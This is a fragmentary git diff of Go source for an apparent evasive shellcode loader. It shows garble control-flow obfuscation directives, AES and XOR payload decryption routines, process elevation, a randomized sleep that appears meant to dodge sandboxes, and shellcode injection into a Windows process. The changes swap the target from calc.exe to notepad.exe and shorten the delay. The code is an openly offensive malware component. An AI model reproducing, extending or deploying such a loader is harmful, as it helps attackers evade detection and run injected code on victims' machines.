@@ -27,7 +27,7 @@ var (
 	XORAESKey, _ = hex.DecodeString("%XORAESKEY%")
 )
 
-//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+// .garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func verifyDataIntegrity(data []byte, stage string) bool {
 	log.Printf("[*] Verifying data integrity at stage: %s", stage)
 	if len(data) == 0 {
@@ -38,11 +38,11 @@ func verifyDataIntegrity(data []byte, stage string) bool {
 	return true
 }
 
-//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+// .garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
 	log.Printf("[*] Starting AES decryption - Input size: %d bytes", len(ciphertext))
 
-
+	// Ensure the decrypted AES key is of a valid size
 	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
 		return nil, fmt.Errorf("[-] Invalid AES key size: %d bytes", len(key))
 	}
@@ -68,7 +68,7 @@ func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
 	return ciphertext, nil
 }
 
-//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+// .garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func xorDecrypt(data, key []byte) ([]byte, error) {
 	log.Printf("[*] Starting XOR decryption - Input size: %d bytes", len(data))
 
@@ -87,7 +87,7 @@ func xorDecrypt(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
-//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+// .garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func decryptkey(data, key []byte) ([]byte, error) {
 	keyLen := len(key)
 	if keyLen == 0 {
@@ -101,7 +101,7 @@ func decryptkey(data, key []byte) ([]byte, error) {
 	return data, nil
 }
 
-//.garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
+// .garble:controlflow flatten_passes=3 junk_jumps=128 block_splits=max flatten_hardening=xor,delegate_table
 func main() {
 	log.SetFlags(0)
 
@@ -113,7 +113,7 @@ func main() {
 	fmt.Println("[+] Process elevated")
 
 	rand.Seed(time.Now().UnixNano())
-	sleepDuration := time.Duration(rand.Intn(15)+10) * time.Second
+	sleepDuration := time.Duration(rand.Intn(15)+1) * time.Second
 	fmt.Printf("[+] Sleeping for %v\n", sleepDuration)
 	time.Sleep(sleepDuration)
 	fmt.Println("[+] Woke Up ... Execution Continues")
@@ -209,7 +209,7 @@ func main() {
 		return
 	}
 
-	exePath := "C:\\Windows\\System32\\calc.exe"
+	exePath := "C:\\Windows\\System32\\notepad.exe"
 	println("[*] Injecting shellcode into process: ", exePath)
 	loader, err := Indirect.Init()
 	if err != nil {
